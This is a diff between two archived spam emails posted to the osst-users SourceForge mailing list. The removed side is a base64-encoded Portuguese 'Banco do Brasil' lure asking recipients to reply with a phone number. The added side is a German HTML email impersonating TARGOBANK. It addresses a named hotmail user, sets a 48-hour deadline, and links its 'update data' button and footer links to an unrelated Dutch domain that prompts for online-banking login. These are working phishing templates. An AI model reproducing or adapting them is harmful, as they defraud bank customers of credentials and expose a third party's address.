@@ -2,88 +2,79 @@ Return-Path: <osst-users-bounces@lists.sourceforge.net>
 X-Original-To: lists+osst-users@lfdr.de
 Delivered-To: lists+osst-users@lfdr.de
 Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
-	by mail.lfdr.de (Postfix) with ESMTPS id B8A72C233F3
-	for <lists+osst-users@lfdr.de>; Fri, 31 Oct 2025 05:26:58 +0100 (CET)
+	by mail.lfdr.de (Postfix) with ESMTPS id F2350C27EBF
+	for <lists+osst-users@lfdr.de>; Sat, 01 Nov 2025 13:57:45 +0100 (CET)
 DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
-	d=lists.sourceforge.net; s=beta; h=Content-Type:Reply-To:List-Subscribe:
-	List-Help:List-Post:List-Archive:List-Unsubscribe:List-Id:Subject:Date:
-	Message-Id:To:From:MIME-Version:Sender:Cc:Content-Transfer-Encoding:
-	Content-ID:Content-Description:Resent-Date:Resent-From:Resent-Sender:
-	Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:References:List-Owner;
-	bh=r4WQJYe3JJf+75B1YLIcf/Pm454ULGQ14avVKJU7sw0=; b=SpMMeIFVIMp7dkE/7Li1HacZzN
-	ow2E09ScgKA0Lv76QKeMN6z30kV40L7drq2ztG5qQV9/E8MUWxujXapNYhpjOsTbJCHnwjXqh0vdW
-	IAiRH5D54YJXzrqYUgHJuvnMgK+OXJZVojGwpCcYKPJOmnd4WyeWrzxlmbZO3PqF28m4=;
-Received: from [127.0.0.1] (helo=sfs-ml-1.v29.lw.sourceforge.com)
-	by sfs-ml-1.v29.lw.sourceforge.com with esmtp (Exim 4.95)
+	d=lists.sourceforge.net; s=beta; h=Content-Type:List-Subscribe:List-Help:
+	List-Post:List-Archive:List-Unsubscribe:List-Id:Subject:Date:Message-Id:To:
+	From:MIME-Version:Sender:Reply-To:Cc:Content-Transfer-Encoding:Content-ID:
+	Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
+	:Resent-Message-ID:In-Reply-To:References:List-Owner;
+	bh=g7LOVkA5H/2FZHQfy3of5oeyTjIdGby4jkwCwo4wJk8=; b=P4Dciz+pO6CvdsCBYDi3sSUfmh
+	0Be/k0rTe/4aVUhTdzFSNi0mM5unTHiwi1mKaCq+nVAIxkzA0L5O3dwEwBN/wFtXPX1ZFJPmmxyi0
+	VY5yX0Q90gf+YfzdW29KYfLZw/UkHN7aav87ZUlemnbHPDKJC8hzPM53X1ovY+GyzrgA=;
+Received: from [127.0.0.1] (helo=sfs-ml-2.v29.lw.sourceforge.com)
+	by sfs-ml-2.v29.lw.sourceforge.com with esmtp (Exim 4.95)
 	(envelope-from <osst-users-bounces@lists.sourceforge.net>)
-	id 1vEgj3-0000P9-Dh
+	id 1vFBAt-0002c1-S8
 	for lists+osst-users@lfdr.de;
-	Fri, 31 Oct 2025 04:26:57 +0000
+	Sat, 01 Nov 2025 12:57:44 +0000
 Received: from [172.30.29.66] (helo=mx.sourceforge.net)
- by sfs-ml-1.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
+ by sfs-ml-2.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
  TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
- (envelope-from <root@virtual13.localdomain>) id 1vEgj2-0000P2-7h
- for osst-users@lists.sourceforge.net; Fri, 31 Oct 2025 04:26:56 +0000
+ (envelope-from <0myuwdbylq@netvigator.com>) id 1vFBAs-0002bi-6Y
+ for osst-users@lists.sourceforge.net; Sat, 01 Nov 2025 12:57:42 +0000
 DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
- d=sourceforge.net; s=x; h=Subject:Date:Message-Id:Reply-To:To:From:
- Content-Transfer-Encoding:Content-Type:MIME-Version:Sender:Cc:Content-ID:
- Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
- :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
- List-Subscribe:List-Post:List-Owner:List-Archive;
- bh=BNYmu4U2uB5APcH1cmKYph3gUH5fKaDe55/tvuzyH8c=; b=FxqIGfSfcTvQj13CBp7fLYLVAP
- raGl4+l+1sFEWfnKPc7Kd/iKlR1XNxvdj4t71iPkUuXLUrZ+WwLxQaIiPxHAqCoEwBcJ+eR9u17sH
- 92mN7HxVNG74D9FSJKGEoqiyu9IzoMHEGCNOvbDsG5m3SeCPfCoEsWClJikybXphsxx0=;
+ d=sourceforge.net; s=x; h=Date:Message-Id:Subject:To:From:
+ Content-Transfer-Encoding:MIME-Version:Content-Type:Sender:Reply-To:Cc:
+ Content-ID:Content-Description:Resent-Date:Resent-From:Resent-Sender:
+ Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:References:List-Id:
+ List-Help:List-Unsubscribe:List-Subscribe:List-Post:List-Owner:List-Archive;
+ bh=zfC80g8ytVpXb4xUvCODEBNKX2mf1nhLgfIuEQBv7jk=; b=WLc78pMJoSodpK7us7F8+yB6yn
+ BeAxGCKDGR4EKVoNdr0QcCVsw4Gy5uurPsvQhob9QJqYgCH5a2nyxoYSbQiLdQHpgJucLCk1FO9gJ
+ Bzl+jnvo7xqI5WSf9dnPFQz3oYJFFSWu8j/pI/HA75a+JbT2Bduuwvhuj2DCb6QhZblc=;
 DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
  ;
- h=Subject:Date:Message-Id:Reply-To:To:From:Content-Transfer-Encoding:
- Content-Type:MIME-Version:Sender:Cc:Content-ID:Content-Description:
- Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:
- In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:
- List-Post:List-Owner:List-Archive;
- bh=BNYmu4U2uB5APcH1cmKYph3gUH5fKaDe55/tvuzyH8c=; b=esX7XTlrhfMolaxee2r0IXHg0j
- KzYNK9zzly4hoGxMXuClZO4CXvly5JuVnWgKgC0j1BOUrvPCCMkEc9XJIPERS5avuEMGnFMxyQZXx
- TSlaAcm1gD7TTTQ7lyZHLcQAGZOUWj2tWGSlEHnkc2NIYLH8ihWAo3OwNuHI0F9Qlnbg=;
-Received: from virtual13.sendmailbox.shop ([45.142.107.176]
- helo=virtual13.localdomain)
- by sfi-mx-2.v28.lw.sourceforge.com with esmtp (Exim 4.95)
- id 1vEgj1-00075y-Qe for osst-users@lists.sourceforge.net;
- Fri, 31 Oct 2025 04:26:56 +0000
-Received: by virtual13.localdomain (Postfix, from userid 0)
- id 16749A046A; Fri, 31 Oct 2025 04:58:30 +0100 (CET)
+ h=Date:Message-Id:Subject:To:From:Content-Transfer-Encoding:MIME-Version:
+ Content-Type:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date:
+ Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
+ References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
+ List-Owner:List-Archive; bh=zfC80g8ytVpXb4xUvCODEBNKX2mf1nhLgfIuEQBv7jk=; b=d
+ yzLxI1iT2qp7Vds0h8gRqXT/C7yD3WGEDvuLTUeH+JhJfCYPJckcmuQwOtXcvfeFumUr+NgRubKNA
+ d99Rp+2n13MzOfF51j4xCU2QG81Mxw90F5h2DHLlGgjzU00v5plNGUpPyPUyFE0xBTiSANdZk62G5
+ hK5cOJAnh5JSFnjg=;
+Received: from mail.onlinewebpeonavon.com ([109.73.172.194])
+ by sfi-mx-2.v28.lw.sourceforge.com with esmtps
+ (TLS1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.95)
+ id 1vFBAs-0008Ri-99 for osst-users@lists.sourceforge.net;
+ Sat, 01 Nov 2025 12:57:42 +0000
+Received: from [127.0.0.1] (localhost [127.0.0.1])
+ by mail.onlinewebpeonavon.com (Postfix) with ESMTP id AD31EFA6A8E
+ for <osst-users@lists.sourceforge.net>; Sat,  1 Nov 2025 07:40:00 -0400 (EDT)
 MIME-Version: 1.0
-From: BB PJ Atualiza <no-reply@virtual13>
+From: TARGOBANK <0myuwdbylq@netvigator.com>
 To: osst-users@lists.sourceforge.net
-Message-Id: <20251031035830.16749A046A@virtual13.localdomain>
-Date: Fri, 31 Oct 2025 04:58:30 +0100 (CET)
-X-Spam-Score: 6.8 (++++++)
-X-Spam-Report: Spam detection software, running on the system "sfi-spamd-2.hosts.colo.sdot.me",
- has identified this incoming email as possible spam.  The original
+Message-Id: <20251101114000.AD31EFA6A8E@mail.onlinewebpeonavon.com>
+Date: Sat,  1 Nov 2025 07:40:00 -0400 (EDT)
+X-Spam-Score: 0.7 (/)
+X-Spam-Report: Spam detection software, running on the system "sfi-spamd-1.hosts.colo.sdot.me",
+ has NOT identified this incoming email as spam.  The original
  message has been attached to this so you can view it or label
  similar future email.  If you have any questions, see
  the administrator of that system for details.
  
- Content preview:  Banco do Brasil — Atualização de Segurança Prezado(a),
-    
+ Content preview:  TARGO BANK Ihre Bank f�r Privatkunden und Unternehmen 
  
- Content analysis details:   (6.8 points, 5.0 required)
+ Content analysis details:   (0.7 points, 5.0 required)
  
   pts rule name              description
  ---- ---------------------- --------------------------------------------------
-  0.2 FREEMAIL_REPLYTO_END_DIGIT Reply-To freemail username ends in digit
-                             [bancodobrasilsac688(at)gmail.com]
-  0.0 HEADER_FROM_DIFFERENT_DOMAINS From and EnvelopeFrom 2nd level mail
-                             domains are different
   0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
   0.0 HTML_MESSAGE           BODY: HTML included in message
-  1.0 RCVD_IN_UCE2           RBL: IP Subnet Listed in UCEPROTECT Level 2
-                             [45.142.107.176 listed in dnsbl-2.uceprotect.net]
-  2.5 HDRS_MISSP             Misspaced headers
-  2.5 FREEMAIL_FORGED_REPLYTO Freemail in Reply-To, but not From
-  0.4 KHOP_HELO_FCRDNS       Relay HELO differs from its IP's reverse DNS
-X-VA-Spam-Flag: YES
-X-Spam-Flag: YES
-X-Headers-End: 1vEgj1-00075y-Qe
-Subject: [Osst-users] [SPAM] Atualizacao cadastral - 412196272992
+  0.6 HTML_MIME_NO_HTML_TAG  HTML-only message, but there is no HTML tag
+X-Headers-End: 1vFBAs-0008Ri-99
+Subject: [Osst-users] =?utf-8?q?Dringend=3A_Ihre_Kundendaten_ben=C3=B6tige?=
+ =?utf-8?q?n_eine_Aktualisierung?=
 X-BeenThere: osst-users@lists.sourceforge.net
 X-Mailman-Version: 2.1.21
 Precedence: list
@@ -95,65 +86,58 @@ List-Post: <mailto:osst-users@lists.sourceforge.net>
 List-Help: <mailto:osst-users-request@lists.sourceforge.net?subject=help>
 List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/osst-users>,
  <mailto:osst-users-request@lists.sourceforge.net?subject=subscribe>
-Reply-To: bancodobrasilsac688@gmail.com
-Content-Type: multipart/mixed; boundary="===============0117413156788146614=="
+Content-Type: multipart/mixed; boundary="===============5840242408080957551=="
 Errors-To: osst-users-bounces@lists.sourceforge.net
 
---===============0117413156788146614==
-Content-Type: text/html; charset=UTF-8
-Content-Transfer-Encoding: base64
+--===============5840242408080957551==
+Content-Type: text/html; charset="us-ascii"
+Content-Transfer-Encoding: 7bit
 
-PCFkb2N0eXBlIGh0bWw+CjxodG1sIGxhbmc9InB0LUJSIj4KPGhlYWQ+CiAgPG1ldGEgY2hhcnNl
-dD0idXRmLTgiPgogIDxzdHlsZT4KICAgIGJvZHkgeyAKICAgICAgZm9udC1mYW1pbHk6ICJTZWdv
-ZSBVSSIsIEFyaWFsLCBzYW5zLXNlcmlmOyAKICAgICAgYmFja2dyb3VuZDojZjRmNmY5OyAKICAg
-ICAgbWFyZ2luOjA7IAogICAgICBwYWRkaW5nOjA7IAogICAgICBjb2xvcjojMmQzNDM2OwogICAg
-fQogICAgLmVtYWlsLWNvbnRhaW5lciB7IAogICAgICBtYXgtd2lkdGg6NjgwcHg7IAogICAgICBt
-YXJnaW46NDBweCBhdXRvOyAKICAgICAgYmFja2dyb3VuZDojZmZmZmZmOyAKICAgICAgYm9yZGVy
-LXJhZGl1czo4cHg7IAogICAgICBib3gtc2hhZG93OjAgNHB4IDIwcHggcmdiYSgwLDAsMCwwLjA4
-KTsgCiAgICAgIG92ZXJmbG93OmhpZGRlbjsKICAgIH0KICAgIC5oZWFkZXIgeyAKICAgICAgYmFj
-a2dyb3VuZDpsaW5lYXItZ3JhZGllbnQoOTBkZWcsIzAwMzM5OSwjRkZDQzAwKTsgCiAgICAgIGNv
-bG9yOiNmZmY7IAogICAgICBwYWRkaW5nOjIwcHggMjhweDsgCiAgICAgIGZvbnQtc2l6ZToxOHB4
-OyAKICAgICAgZm9udC13ZWlnaHQ6NjAwOyAKICAgICAgbGV0dGVyLXNwYWNpbmc6MC4zcHg7CiAg
-ICB9CiAgICAuY29udGVudCB7IAogICAgICBwYWRkaW5nOjI4cHg7IAogICAgICBsaW5lLWhlaWdo
-dDoxLjY7IAogICAgICBmb250LXNpemU6MTVweDsKICAgIH0KICAgIC5jb250ZW50IHAgeyBtYXJn
-aW46MCAwIDE2cHggMDsgfQogICAgLmNlbnRlciB7IHRleHQtYWxpZ246Y2VudGVyOyB9CiAgICAu
-aGlnaGxpZ2h0IHsKICAgICAgYmFja2dyb3VuZDojZmZmYmVhOwogICAgICBib3JkZXItbGVmdDo0
-cHggc29saWQgI0ZGQ0MwMDsKICAgICAgcGFkZGluZzoxNHB4IDE2cHg7CiAgICAgIG1hcmdpbjoy
-MHB4IDA7CiAgICAgIGJvcmRlci1yYWRpdXM6NHB4OwogICAgICBjb2xvcjojMDAzMzk5OwogICAg
-ICBmb250LXdlaWdodDo1MDA7CiAgICB9CiAgICAuZm9vdGVyIHsgCiAgICAgIGJhY2tncm91bmQ6
-I2ZhZmFmYTsgCiAgICAgIGNvbG9yOiM2NjY7IAogICAgICBmb250LXNpemU6MTNweDsgCiAgICAg
-IHBhZGRpbmc6MThweCAyOHB4OyAKICAgICAgdGV4dC1hbGlnbjpjZW50ZXI7IAogICAgICBib3Jk
-ZXItdG9wOjFweCBzb2xpZCAjZWVlOyAKICAgIH0KICA8L3N0eWxlPgo8L2hlYWQ+Cjxib2R5Pgog
-IDxkaXYgY2xhc3M9ImVtYWlsLWNvbnRhaW5lciI+CiAgICA8ZGl2IGNsYXNzPSJoZWFkZXIiPkJh
-bmNvIGRvIEJyYXNpbCDigJQgQXR1YWxpemHDp8OjbyBkZSBTZWd1cmFuw6dhPC9kaXY+CgogICAg
-PGRpdiBjbGFzcz0iY29udGVudCI+CiAgICAgIDxwPjxzdHJvbmc+UHJlemFkbyhhKSw8L3N0cm9u
-Zz48L3A+CgogICAgICA8cD4KICAgICAgICBTb2xpY2l0YW1vcywgcG9yIGdlbnRpbGV6YSwgcXVl
-IGluZm9ybWUgdW0gbsO6bWVybyBkZSB0ZWxlZm9uZSB2w6FsaWRvIHBhcmEgY29udGF0bywgCiAg
-ICAgICAgYSBmaW0gZGUgcmVhbGl6YXJtb3MgYSA8c3Ryb25nPmNvcnJlw6fDo28gZG8gbcOzZHVs
-byBkZSBzZWd1cmFuw6dhPC9zdHJvbmc+IGUsIGFzc2ltLCAKICAgICAgICBldml0YXJtb3MgcG9z
-c8OtdmVpcyBsaW1pdGHDp8O1ZXMgZnV0dXJhcyBlbSBzdWEgPHN0cm9uZz5DaGF2ZSBKPC9zdHJv
-bmc+LgogICAgICA8L3A+CgogICAgICA8cD4KICAgICAgICBSZXNzYWx0YW1vcywgYWluZGEsIGEg
-aW1wb3J0w6JuY2lhIGRlIGRlZmluaXIgdW0gPHN0cm9uZz5wcmF6byBkZSBhdGl2aWRhZGU8L3N0
-cm9uZz4gCiAgICAgICAgcGFyYSBvIGdlcmVuY2lhZG9yIGZpbmFuY2Vpcm8sIGEgZmltIGRlIHBy
-ZXZlbmlyIGV2ZW50dWFpcyBibG9xdWVpb3MgcHJldmVudGl2b3MuCiAgICAgIDwvcD4KCiAgICAg
-IDxkaXYgY2xhc3M9ImhpZ2hsaWdodCBjZW50ZXIiPgogICAgICAgIFBvciBmYXZvciwgcmVzcG9u
-ZGEgZXN0ZSBlLW1haWwgaW5mb3JtYW5kbyBvIG7Dum1lcm8gZGUgdGVsZWZvbmUgcGFyYSBhdHVh
-bGl6YcOnw6NvIGNhZGFzdHJhbC4KICAgICAgPC9kaXY+CiAgICA8L2Rpdj4KCiAgICA8ZGl2IGNs
-YXNzPSJmb290ZXIiPgogICAgICBFc3RlIGUtbWFpbCDDqSB1bWEgY29tdW5pY2HDp8OjbyBhdXRv
-bcOhdGljYSBkbyBCYW5jbyBkbyBCcmFzaWwuPGJyPgogICAgICBOw6NvIHJlc3BvbmRhIGNvbSBk
-YWRvcyBjb25maWRlbmNpYWlzLCBzZW5oYXMgb3UgY8OzZGlnb3MgZGUgYWNlc3NvLgogICAgPC9k
-aXY+CiAgPC9kaXY+CjwvYm9keT4KPC9odG1sPgo=
+<p>&nbsp;</p>
+<div class="x_header" style="border: 0px; font-width: inherit; font-size: 15px; line-height: inherit; font-family: Arial, sans-serif; font-size-adjust: inherit; font-kerning: inherit; font-variant-alternates: inherit; font-variant-ligatures: inherit; font-variant-numeric: inherit; font-variant-east-asian: inherit; font-variant-position: inherit; font-feature-settings: inherit; font-optical-sizing: inherit; font-variation-settings: inherit; margin: 0px; padding: 25px 30px; vertical-align: baseline; color: white; box-sizing: border-box; background: #0056a3; text-align: center;">
+<div class="x_logo" style="border: 0px; font-style: inherit; font-variant-caps: inherit; font-weight: bold; font-width: inherit; font-size: 28px; line-height: inherit; font-size-adjust: inherit; font-kerning: inherit; font-variant-alternates: inherit; font-variant-ligatures: inherit; font-variant-numeric: inherit; font-variant-east-asian: inherit; font-variant-position: inherit; font-feature-settings: inherit; font-optical-sizing: inherit; font-variation-settings: inherit; margin: 0px 0px 10px; padding: 0px; vertical-align: baseline; box-sizing: border-box;">TARGO BANK</div>
+<div class="x_tagline" style="border: 0px; font-style: inherit; font-variant-caps: inherit; font-width: inherit; font-size: 14px; line-height: inherit; font-size-adjust: inherit; font-kerning: inherit; font-variant-alternates: inherit; font-variant-ligatures: inherit; font-variant-numeric: inherit; font-variant-east-asian: inherit; font-variant-position: inherit; font-feature-settings: inherit; font-optical-sizing: inherit; font-variation-settings: inherit; margin: 0px; padding: 0px; vertical-align: baseline; box-sizing: border-box; opacity: 0.9;">Ihre Bank f&uuml;r Privatkunden und Unternehmen</div>
+</div>
+<div class="x_content" style="border: 0px; font-width: inherit; font-size: 15px; line-height: inherit; font-family: Arial, sans-serif; font-size-adjust: inherit; font-kerning: inherit; font-variant-alternates: inherit; font-variant-ligatures: inherit; font-variant-numeric: inherit; font-variant-east-asian: inherit; font-variant-position: inherit; font-feature-settings: inherit; font-optical-sizing: inherit; font-variation-settings: inherit; margin: 0px; padding: 30px; vertical-align: baseline; color: #333333; box-sizing: border-box; caret-color: #333333;">
+<h2 class="x_greeting" style="margin: 0px 0px 20px; padding: 0px; box-sizing: border-box; font-size: 18px; color: #0056a3;">Aktualisierung Ihrer Kundendaten erforderlich</h2>
+<div class="x_message" style="border: 0px; font-style: inherit; font-variant-caps: inherit; font-width: inherit; font-size: inherit; line-height: inherit; font-size-adjust: inherit; font-kerning: inherit; font-variant-alternates: inherit; font-variant-ligatures: inherit; font-variant-numeric: inherit; font-variant-east-asian: inherit; font-variant-position: inherit; font-feature-settings: inherit; font-optical-sizing: inherit; font-variation-settings: inherit; margin: 0px 0px 25px; padding: 0px; vertical-align: baseline; box-sizing: border-box;">
+<p style="margin: 0px; padding: 0px; box-sizing: border-box;">Sehr geehrte(r) yvesclain@hotmail.com,</p>
+<p style="margin: 0px; padding: 0px; box-sizing: border-box;">im Rahmen unserer regelm&auml;&szlig;igen Datenschutz- und Compliance-Pr&uuml;fungen ben&ouml;tigen wir eine Aktualisierung Ihrer hinterlegten Daten.</p>
+<p style="margin: 0px; padding: 0px; box-sizing: border-box;">&nbsp;</p>
+<p style="margin: 0px; padding: 0px; box-sizing: border-box;">Bitte aktualisieren Sie Ihre Daten innerhalb von&nbsp;<span class="x_deadline" style="border: 0px; font-style: inherit; font-variant-caps: inherit; font-weight: bold; font-width: inherit; font-size: inherit; line-height: inherit; font-size-adjust: inherit; font-kerning: inherit; font-variant-alternates: inherit; font-variant-ligatures: inherit; font-variant-numeric: inherit; font-variant-east-asian: inherit; font-variant-position: inherit; font-feature-settings: inherit; font-optical-sizing: inherit; font-variation-settings: inherit; margin: 0px; padding: 0px; vertical-align: baseline; color: #d9534f; box-sizing: border-box;">48 Stunden.</span>.</p>
+</div>
+<div class="x_button-container" style="border: 0px; font-style: inherit; font-variant-caps: inherit; font-width: inherit; font-size: inherit; line-height: inherit; font-size-adjust: inherit; font-kerning: inherit; font-variant-alternates: inherit; font-variant-ligatures: inherit; font-variant-numeric: inherit; font-variant-east-asian: inherit; font-variant-position: inherit; font-feature-settings: inherit; font-optical-sizing: inherit; font-variation-settings: inherit; margin: 30px 0px; padding: 0px; vertical-align: baseline; box-sizing: border-box; text-align: center;"><a class="x_update-button" style="border: 0px; font-style: inherit; font-variant-caps: inherit; font-weight: bold; font-width: inherit; font-size: 16px; line-height: inherit; font-size-adjust: inherit; font-kerning: inherit; font-variant-alternates: inherit; font-variant-ligatures: inherit; font-variant-numeric: inherit; font-variant-east-asian: inherit; font-variant-position: inherit; font-feature-settings: inherit; 
+ font-optical-sizing: inherit; font-variation-settings: inherit; margin: 0px; padding: 14px 30px; vertical-align: baseline; box-sizing: border-box; display: inline-block; background: #0056a3; color: white; text-decoration: none; border-radius: 4px;" title="https://ffm.link/xj8q8me.OEM" rel="noopener noreferrer" href="https://pevdheuvel.nl/pevd" target="_blank">Jetzt Daten aktualisieren</a></div>
+<div class="x_security-note" style="border: 1px solid #ffd166; font-style: inherit; font-variant-caps: inherit; font-width: inherit; font-size: 14px; line-height: inherit; font-size-adjust: inherit; font-kerning: inherit; font-variant-alternates: inherit; font-variant-ligatures: inherit; font-variant-numeric: inherit; font-variant-east-asian: inherit; font-variant-position: inherit; font-feature-settings: inherit; font-optical-sizing: inherit; font-variation-settings: inherit; margin: 20px 0px; padding: 15px; vertical-align: baseline; box-sizing: border-box; background: #fff9e6; border-radius: 4px;">
+<p style="margin: 0px; padding: 0px; box-sizing: border-box;"><strong style="margin: 0px; padding: 0px; box-sizing: border-box;">Sicherheitshinweis:</strong>&nbsp;Sie werden zu unserem gesicherten Online-Banking weitergeleitet und m&uuml;ssen sich mit Ihren Zugangsdaten anmelden, um Ihre Daten zu aktualisieren.</p>
+</div>
+<div class="x_contact-info" style="border-image: none; font-style: inherit; font-variant-caps: inherit; font-width: inherit; font-size: inherit; line-height: inherit; font-size-adjust: inherit; font-kerning: inherit; font-variant-alternates: inherit; font-variant-ligatures: inherit; font-variant-numeric: inherit; font-variant-east-asian: inherit; font-variant-position: inherit; font-feature-settings: inherit; font-optical-sizing: inherit; font-variation-settings: inherit; margin: 25px 0px 0px; padding: 20px 0px 0px; vertical-align: baseline; box-sizing: border-box; border: 1px 0px 0px solid none none #eeeeee currentcolor currentcolor;">
+<p style="margin: 0px; padding: 0px; box-sizing: border-box;">Bei Fragen zur Datenaaktualisierung steht Ihnen unser Kundenservice gerne zur Verf&uuml;gung:</p>
+<p style="margin: 0px; padding: 0px; box-sizing: border-box;"><strong style="margin: 0px; padding: 0px; box-sizing: border-box;">Telefon:</strong>&nbsp;0211 9171-0 (Mo-Fr 8:00-18:00 Uhr)</p>
+<p style="margin: 0px; padding: 0px; box-sizing: border-box;"><strong style="margin: 0px; padding: 0px; box-sizing: border-box;">E-Mail:</strong>&nbsp;service@targobank.de</p>
+</div>
+<p style="margin: 0px; padding: 0px; box-sizing: border-box;">Mit freundlichen Gr&uuml;&szlig;en,<br style="margin: 0px; padding: 0px; box-sizing: border-box;" />Ihr Targo Bank Team</p>
+</div>
+<div class="x_footer" style="border: 0px; font-width: inherit; font-size: 12px; line-height: inherit; font-family: Arial, sans-serif; font-size-adjust: inherit; font-kerning: inherit; font-variant-alternates: inherit; font-variant-ligatures: inherit; font-variant-numeric: inherit; font-variant-east-asian: inherit; font-variant-position: inherit; font-feature-settings: inherit; font-optical-sizing: inherit; font-variation-settings: inherit; margin: 0px; padding: 20px 30px; vertical-align: baseline; color: #666666; box-sizing: border-box; background: #f0f5fb; text-align: center;">
+<div class="x_footer-links" style="border: 0px; font-style: inherit; font-variant-caps: inherit; font-width: inherit; font-size: inherit; line-height: inherit; font-size-adjust: inherit; font-kerning: inherit; font-variant-alternates: inherit; font-variant-ligatures: inherit; font-variant-numeric: inherit; font-variant-east-asian: inherit; font-variant-position: inherit; font-feature-settings: inherit; font-optical-sizing: inherit; font-variation-settings: inherit; margin: 15px 0px; padding: 0px; vertical-align: baseline; box-sizing: border-box;"><a style="border: 0px; font-style: inherit; font-variant-caps: inherit; font-width: inherit; font-size: inherit; line-height: inherit; font-size-adjust: inherit; font-kerning: inherit; font-variant-alternates: inherit; font-variant-ligatures: inherit; font-variant-numeric: inherit; font-variant-east-asian: inherit; font-variant-position: inherit; font-feature-settings: inherit; font-optical-sizing: inherit; font-variation-settings: inherit; 
+ margin: 0px 10px; padding: 0px; vertical-align: baseline; box-sizing: border-box; color: #0056a3; text-decoration: none;" title="https://ffm.link/xj8q8me.OEM" rel="noopener noreferrer" href="https://pevdheuvel.nl/pevd" target="_blank">Impressum</a>&nbsp;<a style="border: 0px; font-style: inherit; font-variant-caps: inherit; font-width: inherit; font-size: inherit; line-height: inherit; font-size-adjust: inherit; font-kerning: inherit; font-variant-alternates: inherit; font-variant-ligatures: inherit; font-variant-numeric: inherit; font-variant-east-asian: inherit; font-variant-position: inherit; font-feature-settings: inherit; font-optical-sizing: inherit; font-variation-settings: inherit; margin: 0px 10px; padding: 0px; vertical-align: baseline; box-sizing: border-box; color: #0056a3; text-decoration: none;" title="https://ffm.link/xj8q8me.OEM" rel="noopener noreferrer" href="https://pevdheuvel.nl/pevd" target="_blank">Datenschutz</a>&nbsp;<a style="border: 0px; font-style: inherit
+ ; font-variant-caps: inherit; font-width: inherit; font-size: inherit; line-height: inherit; font-size-adjust: inherit; font-kerning: inherit; font-variant-alternates: inherit; font-variant-ligatures: inherit; font-variant-numeric: inherit; font-variant-east-asian: inherit; font-variant-position: inherit; font-feature-settings: inherit; font-optical-sizing: inherit; font-variation-settings: inherit; margin: 0px 10px; padding: 0px; vertical-align: baseline; box-sizing: border-box; color: #0056a3; text-decoration: none;" title="https://ffm.link/xj8q8me.OEM" rel="noopener noreferrer" href="https://pevdheuvel.nl/pevd" target="_blank">Kontakt</a></div>
+<div class="x_disclaimer" style="border: 0px; font-style: inherit; font-variant-caps: inherit; font-width: inherit; font-size: 11px; line-height: 1.4; font-size-adjust: inherit; font-kerning: inherit; font-variant-alternates: inherit; font-variant-ligatures: inherit; font-variant-numeric: inherit; font-variant-east-asian: inherit; font-variant-position: inherit; font-feature-settings: inherit; font-optical-sizing: inherit; font-variation-settings: inherit; margin: 15px 0px 0px; padding: 0px; vertical-align: baseline; box-sizing: border-box;">
+<p style="margin: 0px; padding: 0px; box-sizing: border-box;">Diese E-Mail wurde automatisch generiert. Bitte antworten Sie nicht auf diese Nachricht.</p>
+<p style="margin: 0px; padding: 0px; box-sizing: border-box;">Die TARGO BANK wird Sie niemals per E-Mail zur Preisgabe Ihrer Zugangsdaten, PIN oder TAN auffordern.</p>
+<p style="margin: 0px; padding: 0px; box-sizing: border-box;">&copy; 2025 TARGO BANK. Alle Rechte vorbehalten. ref: 7fcba4f8e00d852642c91f4550afc56a</p>
+</div>
+</div>
 
 
-
---===============0117413156788146614==
+--===============5840242408080957551==
 Content-Type: text/plain; charset="us-ascii"
 MIME-Version: 1.0
 Content-Transfer-Encoding: 7bit
 Content-Disposition: inline
 
 
---===============0117413156788146614==
+--===============5840242408080957551==
 Content-Type: text/plain; charset="us-ascii"
 MIME-Version: 1.0
 Content-Transfer-Encoding: 7bit
@@ -164,4 +148,4 @@ Osst-users mailing list
 Osst-users@lists.sourceforge.net
 https://lists.sourceforge.net/lists/listinfo/osst-users
 
---===============0117413156788146614==--
+--===============5840242408080957551==--
